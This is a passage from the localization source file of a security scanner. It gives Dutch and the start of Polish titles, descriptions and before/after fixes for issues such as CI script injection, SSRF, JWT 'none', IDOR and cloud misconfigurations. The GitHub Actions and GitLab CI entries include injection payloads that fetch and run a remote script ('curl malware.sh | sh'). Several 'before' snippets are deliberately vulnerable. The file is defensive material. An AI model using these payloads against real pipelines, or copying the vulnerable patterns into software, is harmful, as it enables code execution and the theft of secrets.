  access                 = "Allow"
  destination_port_range = "22"
  source_address_prefix  = "10.0.0.0/16"  # alleen je eigen privénetwerk, of een bastion host
}`,
    },
  },
  "terraform-hardcoded-secret": {
    title: "Een geheim staat als standaardwaarde van een Terraform-variabele",
    description:
      'Een variabele met een naam als password/secret/token/key heeft een letterlijke waarde in zijn "default". In tegenstelling tot een waarde die tijdens runtime wordt doorgegeven (tfvars, TF_VAR_*-omgevingsvariabelen), komt een default in de broncode terecht — en als de repository gedeeld of openbaar is, kan iedereen hem zien, zelfs zonder toegang tot de Terraform-state.',
    fix: {
      before: `variable "db_password" {
  default = "supersecret123"
}`,
      after: `variable "db_password" {
  # geen default: geef hem mee met een .tfvars-bestand (buiten git) of een TF_VAR_db_password-omgevingsvariabele
  sensitive = true
}`,
    },
  },
  "gha-script-injection": {
    title: "Een waarde die door een externe gebruiker wordt gecontroleerd komt rechtstreeks in een shellcommando van de CI terecht",
    description:
      "Een \"run:\"-commando in een GitHub Actions-workflow interpoleert rechtstreeks een waarde zoals een titel van een pull request, een branchnaam of de tekst van een reactie — allemaal schrijfbaar door iedereen die een pull request of reactie opent, zelfs vanuit een externe fork. Een waarde zoals `\"; curl malware.sh | sh #` zou willekeurige commando's in de CI uitvoeren, met toegang tot elk geheim dat in die workflow beschikbaar is.",
    fix: {
      before: `- run: echo "\${{ github.event.pull_request.title }}"`,
      after: `- env:
    PR_TITLE: \${{ github.event.pull_request.title }}
  run: echo "$PR_TITLE"  # meegegeven als omgevingsvariabele, nooit rechtstreeks in het commando geïnterpoleerd`,
    },
  },
  "gha-pull-request-target-checkout": {
    title: "De workflow voert de code van een externe pull request uit met toegang tot de geheimen van de repository",
    description:
      'De workflow gebruikt "pull_request_target" — die draait met de rechten en geheimen van de basisrepository, zelfs voor een pull request die vanuit een niet-gerelateerde fork is geopend — en checkt de eigen code van de pull request uit ("github.event.pull_request.head"), niet de basisbranch. Wie de pull request opent, krijgt zo effectief zijn eigen code uitgevoerd met toegang tot die geheimen.',
    fix: {
      before: `on:
  pull_request_target:
jobs:
  build:
    steps:
      - uses: actions/checkout@v4
        with:
          ref: \${{ github.event.pull_request.head.sha }}`,
      after: `on:
  pull_request_target:
jobs:
  build:
    steps:
      # Checkt de basisbranch uit, niet de code van de PR — of gebruik
      # "pull_request" in plaats van "pull_request_target" als je de
      # bredere rechten/geheimen niet nodig hebt.
      - uses: actions/checkout@v4`,
    },
  },
  "insecure-deserialization": {
    title: "Verzoekdata wordt gedeserialiseerd met een formaat dat code kan uitvoeren",
    description:
      "pickle (Python), unserialize() (PHP), ObjectInputStream (Java) of de node-serialize-library (Node) deserialiseren een waarde die rechtstreeks uit het verzoek komt. In tegenstelling tot JSON kunnen deze formaten code representeren en uitvoeren tijdens het deserialiseren zelf — wie de verzonden waarde controleert, kan willekeurige code op de server laten uitvoeren.",
    fix: {
      before: `data = pickle.loads(request.data)`,
      after: `import json
data = json.loads(request.data)  # JSON voert tijdens het parsen nooit code uit, in tegenstelling tot pickle`,
    },
  },
  "jwt-none-algorithm": {
    title: 'De code accepteert expliciet ongetekende JWT-tokens ("none"-algoritme)',
    description:
      '"none" komt voor tussen de geaccepteerde algoritmes om een JWT-token te verifiëren. Een token met het "none"-algoritme heeft geen handtekening om te verifiëren: iedereen kan er een maken met willekeurige inhoud (bijv. een beheerdersrol) en de code zou hem als geldig accepteren.',
    fix: {
      before: `jwt.verify(token, secret, { algorithms: ["HS256", "none"] })`,
      after: `jwt.verify(token, secret, { algorithms: ["HS256"] })  // neem "none" nooit op tussen de geaccepteerde algoritmes`,
    },
  },
  "unprotected-new-table": {
    title: "Er lijkt een nieuwe tabel te worden aangemaakt zonder bescherming",
    description:
      "Een SQL-migratie maakt een tabel aan maar schakelt Row Level Security voor diezelfde tabel niet in binnen hetzelfde bestand. Zolang dit zo blijft, begint de tabel zonder enige beperking op wie hem kan lezen of beschrijven.",
    fix: {
      before: `CREATE TABLE public.invoices (
  id uuid PRIMARY KEY,
  user_id uuid REFERENCES auth.users
);`,
      after: `CREATE TABLE public.invoices (
  id uuid PRIMARY KEY,
  user_id uuid REFERENCES auth.users
);
ALTER TABLE public.invoices ENABLE ROW LEVEL SECURITY;`,
    },
  },
  "permissive-cors": {
    title: "De site accepteert verzoeken van elke andere website",
    description:
      "De CORS-header is ingesteld om verzoeken van elke origin (*) te accepteren, of de cors()-middleware wordt zonder beperkingen gebruikt. Elke website van derden kan je API's aanroepen vanuit de browser van een al geauthenticeerde gebruiker.",
    fix: {
      before: `app.use(cors())`,
      after: `app.use(cors({ origin: ["https://tuosito.com"] }))`,
    },
  },
  "admin-function-missing-auth": {
    title: "Een functie met beheerdersrechten controleert niet wie hem gebruikt",
    description:
      "Een route of functie waarvan de naam op beheerdersactiviteiten wijst, bevat in de nabije regels geen enkele authenticatie- of rolcontrole. Iedereen die de URL kent, zou hem kunnen uitvoeren.",
    fix: {
      before: `router.post("/admin/delete-user", async (req, res) => {
  await db.users.delete(req.body.id)
})`,
      after: `router.post("/admin/delete-user", requireAuth, requireRole("admin"), async (req, res) => {
  await db.users.delete(req.body.id)
})`,
    },
  },
  ssrf: {
    title: "De site kan worden gedwongen externe code uit te voeren",
    description:
      "Een uitgaand HTTP-verzoek (fetch, axios) gebruikt rechtstreeks een waarde uit een verzoek van een gebruiker als bestemmings-URL. Een kwaadwillende gebruiker kan je server interne of willekeurige adressen laten aanroepen — Server-Side Request Forgery.",
    fix: {
      before: `const data = await fetch(req.query.url)`,
      after: `const ALLOWED = new Set(["https://api.jouwdienst.com"])
if (!ALLOWED.has(req.query.url)) throw new Error("URL niet toegestaan")
const data = await fetch(req.query.url)`,
    },
  },
  "weak-password-hashing": {
    title: "Wachtwoorden worden beschermd met een methode die nu makkelijk te kraken is",
    description:
      "Op dezelfde regel worden md5() of sha1() toegepast op een waarde die aan een wachtwoord is gekoppeld. Deze algoritmes zijn te snel te berekenen: een aanvaller met de database kan miljarden wachtwoorden per seconde proberen.",
    fix: {
      before: `const hashed = crypto.createHash("md5").update(password).digest("hex")`,
      after: `const hashed = await bcrypt.hash(password, 12)`,
    },
  },
  "k8s-run-as-root": {
    title: "Een container in het Kubernetes-manifest is ingesteld om als root te draaien",
    description:
      '"runAsUser: 0" of "runAsNonRoot: false" in de securityContext dwingen de container expliciet om als root te draaien. Als een aanvaller erin slaagt code binnen de container uit te voeren (bijv. door een kwetsbare library te misbruiken), maakt root zijn binnen de container een ontsnapping naar de host — of een bredere impact — makkelijker.',
    fix: {
      before: `securityContext:
  runAsUser: 0`,
      after: `securityContext:
  runAsNonRoot: true
  runAsUser: 1000`,
    },
  },
  "k8s-privilege-escalation": {
    title: "Een container in het Kubernetes-manifest kan meer rechten verkrijgen dan waarmee hij begon",
    description:
      '"allowPrivilegeEscalation: true" in de securityContext laat een proces binnen de container meer rechten verkrijgen dan het proces dat het startte (bijv. via een setuid-binary). Gecombineerd met een kwetsbaarheid in de applicatie is dit weer een stap richting het uitvoeren van code met meer rechten dan bedoeld.',
    fix: {
      before: `securityContext:
  allowPrivilegeEscalation: true`,
      after: `securityContext:
  allowPrivilegeEscalation: false`,
    },
  },
  "k8s-host-namespace-access": {
    title: "Een pod in het Kubernetes-manifest deelt het netwerk, de processen of het gedeelde geheugen van de host",
    description:
      '"hostNetwork", "hostPID" of "hostIPC" op true halen de pod uit zijn normale isolatie: hostNetwork stelt de pod bloot op het netwerk van de host (waarbij de netwerkpolicies van de cluster worden omzeild), hostPID geeft zicht op elk proces op de hostmachine, hostIPC geeft toegang tot het gedeelde geheugen van de host. Vrijwel nooit nodig voor een normale app — meestal alleen voor laagwaardige systeem-/monitoringtools.',
    fix: {
      before: `spec:
  hostNetwork: true`,
      after: `spec:
  hostNetwork: false`,
    },
  },
  "terraform-s3-block-public-access-disabled": {
    title: "Block Public Access is uitgeschakeld op een S3-bucket gedefinieerd in Terraform",
    description:
      'Een of meer van de vier beveiligingen in "aws_s3_bucket_public_access_block" (block_public_acls, ignore_public_acls, block_public_policy, restrict_public_buckets) staan op false. Dat betekent niet dat de bucket al openbaar is, maar het verwijdert een vangnet dat zou voorkomen dat hij per ongeluk openbaar wordt gemaakt in de toekomst.',
    fix: {
      before: `resource "aws_s3_bucket_public_access_block" "example" {
  block_public_acls = false
}`,
      after: `resource "aws_s3_bucket_public_access_block" "example" {
  block_public_acls       = true
  ignore_public_acls      = true
  block_public_policy     = true
  restrict_public_buckets = true
}`,
    },
  },
  "terraform-iam-wildcard-policy": {
    title: "Een IAM-policy gedefinieerd in Terraform verleent volledige toegang",
    description:
      'Een statement met actie "*" en resource "*" verleent volledige toegang tot elke AWS-service en -resource — dezelfde controle die al wordt gedaan op de live IAM-status, hier rechtstreeks uit de code gelezen voordat die zelfs maar wordt toegepast. Het kan bedoeld zijn voor een noodrol, maar dat moet worden bevestigd: voor dagelijks gebruik verleen je alleen de rechten die echt nodig zijn.',
    fix: {
      before: `statement {
  effect    = "Allow"
  actions   = ["*"]
  resources = ["*"]
}`,
      after: `statement {
  effect    = "Allow"
  actions   = ["s3:GetObject"]
  resources = ["arn:aws:s3:::je-bucket/*"]
}`,
    },
  },
  "gcp-storage-bucket-public": {
    title: "Een Google Cloud Storage-bucket wordt leesbaar gemaakt voor iedereen",
    description:
      'Een "google_storage_bucket_iam_member"- of "google_storage_bucket_iam_binding"-resource verleent een rol aan "allUsers" of "allAuthenticatedUsers" — de eerste maakt de bucket leesbaar voor iedereen op internet, zelfs zonder Google-account; de tweede voor iedereen met een willekeurig Google-account, niet alleen wie toegang zou moeten hebben.',
    fix: {
      before: `resource "google_storage_bucket_iam_member" "public" {
  bucket = google_storage_bucket.example.name
  role   = "roles/storage.objectViewer"
  member = "allUsers"
}`,
      after: `resource "google_storage_bucket_iam_member" "example" {
  bucket = google_storage_bucket.example.name
  role   = "roles/storage.objectViewer"
  member = "user:iemand@example.com"  # alleen wie er echt toegang toe zou moeten hebben, niet allUsers/allAuthenticatedUsers
}`,
    },
  },
  "azure-storage-public-access": {
    title: "Openbare blobtoegang is ingeschakeld op een Azure-opslagaccount",
    description:
      '"allow_blob_public_access" staat op true op een "azurerm_storage_account": iedereen die de URL van een openbaar gemaakte blob/container kent, kan hem lezen, zonder enige authenticatie.',
    fix: {
      before: `resource "azurerm_storage_account" "example" {
  allow_blob_public_access = true
}`,
      after: `resource "azurerm_storage_account" "example" {
  allow_blob_public_access = false
}`,
    },
  },
  "gcp-iam-overly-broad-role": {
    title: "Een Google Cloud IAM-rol verleent volledige toegang (Owner/Editor)",
    description:
      'Een "google_project_iam_binding"/"google_project_iam_member" (of het equivalent op organisatie-/mapniveau) wijst de primitieve rol "roles/owner" of "roles/editor" toe — bijna volledige toegang tot elke service in het project. Het kan bedoeld zijn voor een noodaccount, maar dat moet worden bevestigd: voor dagelijks gebruik verleen je alleen de specifiekere vooraf gedefinieerde rollen die echt nodig zijn.',
    fix: {
      before: `resource "google_project_iam_member" "admin" {
  project = "my-project"
  role    = "roles/owner"
  member  = "user:dev@example.com"
}`,
      after: `resource "google_project_iam_member" "admin" {
  project = "my-project"
  role    = "roles/storage.admin"  # alleen de vooraf gedefinieerde rol die echt nodig is, niet roles/owner
  member  = "user:dev@example.com"
}`,
    },
  },
  "azure-role-assignment-owner": {
    title: "Een Azure-roltoewijzing verleent volledige toegang (Owner)",
    description:
      'Een "azurerm_role_assignment" wijst de rol "Owner" toe — volledige toegang, inclusief controle over de rechten van andere gebruikers, over de hele toegewezen scope (abonnement, resourcegroep...). Het kan bedoeld zijn voor een noodaccount, maar dat moet worden bevestigd: voor dagelijks gebruik verleen je alleen de specifiekere rol die echt nodig is (bijv. "Contributor" op één resourcegroep).',
    fix: {
      before: `resource "azurerm_role_assignment" "example" {
  scope                = data.azurerm_subscription.primary.id
  role_definition_name = "Owner"
}`,
      after: `resource "azurerm_role_assignment" "example" {
  scope                = azurerm_resource_group.example.id
  role_definition_name = "Contributor"  # alleen de specifiekere rol die echt nodig is, niet Owner op het hele abonnement
}`,
    },
  },
  "weak-random-token": {
    title: "Een beveiligingstoken wordt gegenereerd met een generator voor willekeurige getallen die niet cryptografisch veilig is",
    description:
      "Een waarde met een naam als token/session/reset/otp/csrf wordt gegenereerd met Math.random() (JS), random.random() (Python) of rand() (PHP) — generators die niet voor beveiliging zijn ontworpen, waarvan de reeksen voorspelbaar zijn. Een token dat zo is gegenereerd, kan worden geraden of gereconstrueerd, wat het doel ervan tenietdoet (bijv. een link voor wachtwoordherstel die iedereen zou kunnen voorspellen).",
    fix: {
      before: `const resetToken = Math.random().toString(36).slice(2);`,
      after: `const resetToken = crypto.randomBytes(32).toString("hex"); // crypto, niet Math.random — onvoorspelbaar`,
    },
  },
  "ldap-injection": {
    title: "Een LDAP-filter wordt opgebouwd door rechtstreeks een verzoekwaarde te concateneren",
    description:
      'Een regel die een LDAP-filter opbouwt (bijv. "(uid=...)") bevat rechtstreeks een waarde uit het verzoek, zonder enige escaping van speciale LDAP-tekens. Wie die waarde controleert, kan de logica van het filter veranderen — bijvoorbeeld een authenticatiecontrole omzeilen of directorygegevens lezen die hij niet zou mogen zien.',
    fix: {
      before: `const filter = \`(uid=\${req.body.username})\`;
client.search(base, { filter });`,
      after: `const filter = \`(uid=\${ldapEscape(req.body.username)})\`; // speciale LDAP-tekens moeten altijd worden ge-escaped voordat ze in een filter worden gebruikt
client.search(base, { filter });`,
    },
  },
  "xss-dangerous-html": {
    title: "Tekst geschreven door gebruikers zou code in de browser kunnen uitvoeren",
    description:
      "Inhoud wordt als ruwe HTML in de pagina ingevoegd (dangerouslySetInnerHTML, v-html, .innerHTML) in plaats van als platte tekst. Als die inhoud gebruikersinvoer bevat, kan die scripts bevatten die worden uitgevoerd in de browser van wie de pagina leest.",
    fix: {
      before: `<div dangerouslySetInnerHTML={{ __html: comment.text }} />`,
      after: `<div>{comment.text}</div>
// of, als HTML nodig is: DOMPurify.sanitize(comment.text)`,
    },
  },
  "public-storage-bucket": {
    title: "De ruimte voor geüploade bestanden is zichtbaar voor iedereen",
    description:
      "Een storage bucket (Supabase Storage, S3) is geconfigureerd als openbaar. Als die documenten, foto's of door gebruikers geüploade bestanden bevat, kan iedereen die het pad kent — of raadt — er zonder authenticatie bij.",
    fix: {
      before: `supabase.storage.createBucket("uploads", { public: true })`,
      after: `supabase.storage.createBucket("uploads", { public: false })
// serveer bestanden met tijdelijk geldige signed URL's: createSignedUrl(path, 60)`,
    },
  },
  "csrf-state-changing-get": {
    title: "Eén link is genoeg om data te verwijderen of te wijzigen",
    description:
      "Een GET-route voert een bewerking uit die data wijzigt (het pad bevat delete/remove/update/edit). GET-verzoeken worden al uitgevoerd door simpelweg een link te bezoeken of een afbeelding van een externe site te laden — het klassieke opstapje voor een CSRF-aanval.",
    fix: {
      before: `router.get("/posts/:id/delete", deletePost)`,
      after: `router.post("/posts/:id/delete", requireAuth, csrfProtection, deletePost)`,
    },
  },
  "insecure-token-storage": {
    title: "Logingegevens opgeslagen in de browser zijn niet goed beschermd",
    description:
      "Een toegangstoken wordt opgeslagen in localStorage. In tegenstelling tot een httpOnly-cookie kan elk script dat op de pagina draait (inclusief kwaadaardige code die via XSS is geïnjecteerd) hem lezen en stelen.",
    fix: {
      before: `localStorage.setItem("authToken", token)`,
      after: `// stel het token in als httpOnly-cookie vanaf de server:
res.cookie("authToken", token, { httpOnly: true, secure: true, sameSite: "strict" })`,
    },
  },
  "open-redirect": {
    title: "De site kan worden gebruikt om door te verwijzen naar een scamwebsite",
    description:
      "De site verwijst de gebruiker door naar een adres dat rechtstreeks uit het verzoek komt (query, body, params) zonder te controleren dat het een bekend domein is. Een link die eruitziet alsof die naar je site verwijst, kan in werkelijkheid naar een phishingpagina leiden.",
    fix: {
      before: `res.redirect(req.query.next)`,
      after: `const ALLOWED = new Set(["/dashboard", "/profile"])
res.redirect(ALLOWED.has(req.query.next) ? req.query.next : "/dashboard")`,
    },
  },
  idor: {
    title: "Het wijzigen van een nummer in het adres kan andermans gegevens tonen",
    description:
      "Een databasequery gebruikt rechtstreeks een identifier uit de URL (req.params.id) zonder in de nabije regels te controleren dat die bij de gebruiker hoort die het verzoek doet. Het wijzigen van het id in het adres zou toegang kunnen geven tot de gegevens van een andere gebruiker — Insecure Direct Object Reference.",
    fix: {
      before: `const order = await Order.findById(req.params.id)`,
      after: `const order = await Order.findOne({ _id: req.params.id, userId: req.user.id })`,
    },
  },
  "header-injection": {
    title: "Een verzoekwaarde komt rechtstreeks in een HTTP-responseheader terecht",
    description:
      "Een HTTP-responseheader wordt ingesteld met een waarde die rechtstreeks uit het verzoek komt (query, body, params), zonder te controleren dat die geen regeleinde (CRLF) bevat. Een aanvaller kan extra headers invoegen of zelfs een volledig andere response — response splitting — waardoor cache, cookies of de inhoud die aan andere gebruikers wordt getoond, kunnen worden gemanipuleerd.",
    fix: {
      before: `res.setHeader("X-Redirect-Reason", req.query.reason)`,
      after: `const ALLOWED_REASONS = new Set(["expired", "manual"])
res.setHeader("X-Redirect-Reason", ALLOWED_REASONS.has(req.query.reason) ? req.query.reason : "unknown")`,
    },
  },
  "docker-missing-user": {
    title: "De Dockerfile stelt geen non-root-gebruiker in",
    description:
      "Geen USER-instructie in de Dockerfile: zonder die draait de container als root. Als een aanvaller erin slaagt code binnen de container uit te voeren (bijv. door een kwetsbare library te misbruiken), maakt root zijn binnen de container een ontsnapping naar de host — of een bredere impact op het omliggende systeem — makkelijker.",
    fix: {
      before: `FROM node:20-slim
WORKDIR /app
COPY . .
CMD ["node", "server.js"]`,
      after: `FROM node:20-slim
WORKDIR /app
COPY . .
USER node
CMD ["node", "server.js"]`,
    },
  },
  "k8s-missing-run-as-non-root": {
    title: "Het Kubernetes-manifest dwingt niet expliciet af dat als non-root-gebruiker wordt gedraaid",
    description:
      'Nergens in het manifest staat "runAsNonRoot" (niet op pod- en niet op containerniveau): zonder dit in te stellen, draait een container als welke gebruiker de image ook definieert — vaak standaard root, als de image dat zelf niet heeft veranderd. Door het expliciet op true te zetten, start de pod niet als de image nog steeds als root probeert te draaien, in plaats van dat je dit pas na een incident ontdekt.',
    fix: {
      before: `containers:
  - name: app
    image: myapp:1.0`,
      after: `containers:
  - name: app
    image: myapp:1.0
    securityContext:
      runAsNonRoot: true`,
    },
  },
  "gha-unpinned-action": {
    title: "Een CI-actie van derden is niet vastgezet op een precieze versie (commit-SHA)",
    description:
      'De workflow gebruikt een actie van derden die wordt gerefereerd via tag of branch (bijv. "@v1", "@main") in plaats van via commit-SHA. Wie het beheert — of wie dat account compromitteert — kan die referentie op elk moment naar een andere commit verplaatsen, waardoor stilletjes verandert wat er in de CI draait, met toegang tot de geheimen ervan. Een commit-SHA wijst altijd naar exact dezelfde code.',
    fix: {
      before: `uses: some-org/some-action@v1`,
      after: `uses: some-org/some-action@a1b2c3d4e5f6...  # v1, vastgezet op de commit-SHA — werk de SHA bij wanneer je de versie bijwerkt`,
    },
  },
  "gha-excessive-permissions": {
    title: "De workflow geeft zichzelf alle tokenrechten in plaats van alleen de rechten die hij gebruikt",
    description:
      '"permissions: write-all" geeft de GITHUB_TOKEN van de workflow schrijftoegang tot alles — issues, pull requests, packages, deployments — zelfs als de workflow er maar een deel van gebruikt. Als een stap in de workflow wordt gecompromitteerd (een kwaadaardige dependency, een geïnjecteerd script), vergroten die bredere rechten wat wie dat misbruikt kan doen.',
    fix: {
      before: `permissions: write-all`,
      after: `permissions:
  contents: read
  pull-requests: write  # alleen de rechten die de workflow echt gebruikt`,
    },
  },
  "insecure-cookie-flags": {
    title: "Een sessie- of authenticatiecookie wordt ingesteld zonder de vlaggen Secure en HttpOnly",
    description:
      'Een cookie met een naam die lijkt op sessie/auth/token wordt ingesteld zonder "httpOnly" en "secure" tussen de opties. Zonder httpOnly kan JavaScript op de pagina — inclusief via XSS geïnjecteerde code — die cookie lezen. Zonder secure kan hij ook worden verzonden over een niet-versleutelde HTTP-verbinding.',
    fix: {
      before: `res.cookie("session", sessionId)`,
      after: `res.cookie("session", sessionId, { httpOnly: true, secure: true, sameSite: "strict" })`,
    },
  },
  "no-login-rate-limit": {
    title: "Het loginformulier blokkeert niet bij te veel pogingen achter elkaar",
    description:
      "Een loginroute is gedefinieerd in het bestand, maar er is geen spoor van rate-limiting-middleware in hetzelfde bestand. Zonder limiet op pogingen kan een aanvaller wachtwoorden na elkaar proberen (brute force) zonder te worden vertraagd.",
    fix: {
      before: `router.post("/login", loginHandler)`,
      after: `import rateLimit from "express-rate-limit"
const loginLimiter = rateLimit({ windowMs: 15 * 60 * 1000, max: 5 })
router.post("/login", loginLimiter, loginHandler)`,
    },
  },
  "sensitive-data-in-logs": {
    title: "Wachtwoorden of gevoelige gegevens komen terecht in logs",
    description:
      "Een aanroep van console.log (of vergelijkbaar) bevat een variabele genaamd password, token, secret of apiKey. Als deze logs terechtkomen in een externe service of een bestand, blijven gevoelige gegevens veel langer blootgesteld dan nodig.",
    fix: {
      before: `console.log("login attempt", { email, password })`,
      after: `console.log("login attempt", { email })`,
    },
  },
  "docker-unpinned-base-image": {
    title: 'De basisimage van de Dockerfile gebruikt de tag ":latest"',
    description:
      'Een FROM-instructie gebruikt expliciet de tag ":latest" in plaats van een precieze versie. "latest" verandert in de loop van de tijd: dezelfde build, op een ander moment opnieuw uitgevoerd, kan een andere versie van de basisimage krijgen — een niet-reproduceerbare build, en een ongewenste update kan binnenkomen zonder dat iemand heeft besloten dat die zou moeten.',
    fix: {
      before: `FROM node:latest`,
      after: `FROM node:20.11-slim`,
    },
  },
  "docker-add-remote-url": {
    title: "De Dockerfile downloadt een extern bestand met ADD in plaats van COPY",
    description:
      "Een ADD-instructie met een http/https-URL downloadt tijdens de build een bestand van internet, zonder integriteitscontrole en met inhoud die onzichtbaar is in de repository. Als die URL ooit wordt gecompromitteerd, haalt de build willekeurige inhoud binnen zonder dat iemand dat merkt door alleen de Dockerfile te lezen.",
    fix: {
      before: `ADD https://example.com/install.sh /tmp/install.sh`,
      after: `RUN curl -fsSL https://example.com/install.sh -o /tmp/install.sh \\
    && echo "<verwachte hash>  /tmp/install.sh" | sha256sum -c -`,
    },
  },
  "vulnerable-dependency": (original) => ({
    title: original.title.replace("Dipendenza vulnerabile:", "Kwetsbare dependency:"),
    description: original.description,
    fix: {
      before: original.fix.before,
      after: original.fix.after.replace(
        "Nessuna versione corretta nota ancora — valuta un pacchetto alternativo o segui gli aggiornamenti del progetto.",
        "Nog geen gecorrigeerde versie bekend — overweeg een alternatief pakket of volg de updates van het project."
      ),
    },
  }),
    "gitlab-ci-script-injection": {
      title: 'Een door een externe gebruiker gecontroleerde waarde gaat via een tweede shell in de GitLab CI-pipeline',
      description: 'Een "script:"-regel (of "before_script:"/"after_script:") gebruikt "eval" of "sh -c"/"bash -c" samen met een vooraf gedefinieerde GitLab-variabele zoals de titel van de merge request, de commit-message of de branchnaam — allemaal te schrijven door iedereen die een merge request opent, zelfs vanuit een externe fork. De waarde wordt eerst door de buitenste shell geëxpandeerd en vervolgens geplakt in een string die de tweede shell opnieuw als code interpreteert: een titel als "$(curl malware.sh | sh)" zou willekeurige commando\'s uitvoeren in de pipeline, met toegang tot alle secrets die in die job beschikbaar zijn.',
      fix: {
        before: `script:
  - bash -c "deploy.sh $CI_MERGE_REQUEST_TITLE"`,
        after: `script:
  - deploy.sh "$CI_MERGE_REQUEST_TITLE"  # doorgegeven als argument aan het commando, nooit binnen een "bash -c"-string die het opnieuw zou interpreteren`,
      },
    },
    "gitlab-ci-privileged-dind-no-tls": {
      title: 'Docker-in-Docker in de GitLab CI-pipeline draait met uitgeschakelde TLS-versleuteling',
      description: 'De job gebruikt de "docker:dind"-service (Docker-in-Docker, nodig om images binnen de pipeline te bouwen), maar zet "DOCKER_TLS_CERTDIR" op een lege string, waardoor TLS-versleuteling tussen de Docker-client en de dind-daemon volledig wordt uitgeschakeld. Zonder TLS kan iedereen die die poort op hetzelfde interne netwerk van de runner kan bereiken de Docker-daemon — die met uitgebreide rechten draait — overnemen, in plaats van beperkt te blijven tot de job die hem zou moeten gebruiken.',
      fix: {
        before: `services:
  - docker:dind
variables:
  DOCKER_TLS_CERTDIR: ""`,
        after: `services:
  - docker:dind
variables:
  DOCKER_TLS_CERTDIR: "/certs"  # TLS blijft actief tussen de Docker-client en de dind-daemon — "" schakelt het volledig uit`,
      },
    },
    "gitlab-ci-unpinned-image": {
      title: 'De Docker-image van de GitLab CI-pipeline is niet vastgezet op een specifieke versie',
      description: 'Een "image:" in de pipeline wijst naar een image zonder tag (gelijk aan ":latest") of expliciet naar ":latest". Wie dat image onderhoudt, kan de inhoud op elk moment vervangen zonder dat de repository verandert — dezelfde pipeline kan van de ene op de andere dag andere code gaan draaien, een supply-chain-risico dat conceptueel identiek is aan een GitHub Action die via een tag in plaats van een commit wordt gerefereerd.',
      fix: {
        before: `image: node:latest`,
        after: `image: node:20.11.1  # een specifieke tag (of nog beter een digest "node@sha256:...") in plaats van "latest"`,
      },
    },
},
  pl: {
  "supabase-service-role-in-client": {
    title: "Tajny klucz Supabase trafia do pliku widocznego w przeglądarce",
    description:
      "Zmienna z publicznym prefiksem (np. NEXT_PUBLIC_, VITE_) lub plik po stronie klienta odwołuje się do service role key Supabase. Ten klucz omija Row Level Security: jeśli trafi do pakietu przeglądarki, każdy może go odczytać i działać jako administrator bazy danych.",
    fix: {
      before: `// components/Dashboard.tsx\nconst supabase = createClient(url, process.env.NEXT_PUBLIC_SUPABASE_SERVICE_ROLE_KEY)`,
      after: `// app/api/admin/route.ts (tylko serwer)\nconst supabase = createClient(url, process.env.SUPABASE_SERVICE_ROLE_KEY)`,
    },
  },
  "hardcoded-secret": {
    title: "Hasła lub tajne klucze są zapisane bezpośrednio w kodzie",
    description:
      "Klucz API, token lub hasło wygląda na zapisane jako wartość literalna zamiast odczytywane ze zmiennej środowiskowej. Każdy, kto przeczyta kod źródłowy (lub repozytorium, jeśli jest publiczne), zdobywa ten sekret.",
    fix: {
      before: `const apiKey = "sk_live_51H8x9K2eZvKYlo2C..."`,
      after: `const apiKey = process.env.STRIPE_SECRET_KEY`,
    },
  },
  "env-file-with-real-values": {
    title: "Plik z prawdziwymi hasłami projektu jest wśród analizowanych",
    description:
      "Plik .env z prawdziwymi wartościami (nie .env.example) jest uwzględniony w analizie. Jeśli ten plik trafi do repozytorium lub publicznego wdrożenia, wszystkie zawarte w nim dane uwierzytelniające zostają ujawnione.",
    fix: {
      before: `# .env (zacommitowany przez pomyłkę)\nDATABASE_URL=postgres://user:realpassword@db.host/prod`,
      after: `# .env.example (zacommitowany)\nDATABASE_URL=postgres://user:password@localhost/dev\n\n# .env pozostaje poza repozytorium (.gitignore)`,
    },
  },
  "missing-row-level-security": {
    title: "Każdy może odczytać lub zmodyfikować dane wszystkich użytkowników",
    description:
      "Row Level Security jest wyłączone, albo zasada zezwala na dostęp każdemu (USING (true)) bez sprawdzania, kto wysyła żądanie. Każdy uwierzytelniony użytkownik — a nawet anonimowy — może odczytać lub zmodyfikować dane wszystkich innych.",
    fix: {
      before: `ALTER TABLE public.orders DISABLE ROW LEVEL SECURITY;`,
      after: `ALTER TABLE public.orders ENABLE ROW LEVEL SECURITY;\nCREATE POLICY "owners only" ON public.orders\n  USING (auth.uid() = user_id);`,
    },
  },
  "sql-injection": {
    title: "Wartość wprowadzona przez użytkownika trafia bezpośrednio do zapytania w bazie danych",
    description:
      "Zapytanie SQL jest budowane przez bezpośrednią konkatenację lub interpolację ciągu znaków zamiast użycia parametrów. Jeśli ten tekst pochodzi (nawet pośrednio) od użytkownika, może zmienić samo zapytanie — SQL injection.",
    fix: {
      before: "db.query(`SELECT * FROM users WHERE email = '${email}'`)",
      after: `db.query("SELECT * FROM users WHERE email = $1", [email])`,
    },
  },
  "plaintext-password-storage": {
    title: "Hasła wydają się być niezabezpieczone",
    description:
      "Pole hasła jest zapisywane dokładnie tak, jak przyszło w żądaniu, a w pliku nie pojawia się żadna funkcja haszowania (bcrypt, argon2, scrypt). Jeśli baza danych zostanie naruszona, wszystkie hasła są natychmiast użyteczne.",
    fix: {
      before: `await db.users.insert({ email, password: req.body.password })`,
      after: `const hashed = await bcrypt.hash(req.body.password, 12)\nawait db.users.insert({ email, password: hashed })`,
    },
  },
  "hardcoded-jwt-secret": {
    title: "Sekret używany do podpisywania logowań jest zapisany jawnie w kodzie",
    description:
      "Sekret przekazywany do jwt.sign / jwt.verify (lub zmienna JWT_SECRET) jest wartością literalną w kodzie zamiast pochodzić ze zmiennej środowiskowej. Każdy, kto go przeczyta, może tworzyć ważne tokeny dostępu dla dowolnego użytkownika.",
    fix: {
      before: `jwt.sign(payload, "super-secret-key-123")`,
      after: `jwt.sign(payload, process.env.JWT_SECRET)`,
    },
  },
  "command-injection": {
    title: "Serwer można zmusić do wykonania zewnętrznych poleceń",
    description:
      "Funkcja wykonująca polecenia systemowe (exec, execSync, spawn) otrzymuje ciąg znaków zbudowany przez interpolację lub konkatenację. Jeśli część tego ciągu pochodzi z danych wejściowych użytkownika, osoba nim sterująca może uruchomić dowolne polecenia na serwerze.",
    fix: {
      before: "execSync(`convert ${filename} output.png`)",
      after: `execFile("convert", [filename, "output.png"])`,
    },
  },
  "path-traversal": {
    title: "Plik na serwerze można odczytać lub zapisać, wybierając ścieżkę z zewnątrz",
    description:
      'Funkcja, która odczytuje, zapisuje lub wysyła plik, pobiera ścieżkę bezpośrednio z wartości żądania (query, body, params) bez sprawdzenia, czy pozostaje w dozwolonym folderze. Atakujący może wstawić "../", aby wyjść z zamierzonego folderu i odczytać lub nadpisać dowolne pliki na serwerze (np. plik konfiguracyjny z danymi uwierzytelniającymi).',
    fix: {
      before: `app.get("/download", (req, res) => {\n  res.sendFile(req.query.file)\n})`,
